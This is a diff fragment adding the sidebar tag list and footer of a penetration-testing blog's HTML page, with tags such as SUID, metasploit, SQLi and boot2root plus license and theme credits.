+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/webmin.html">webmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/api.html">api</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/web.html">web</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
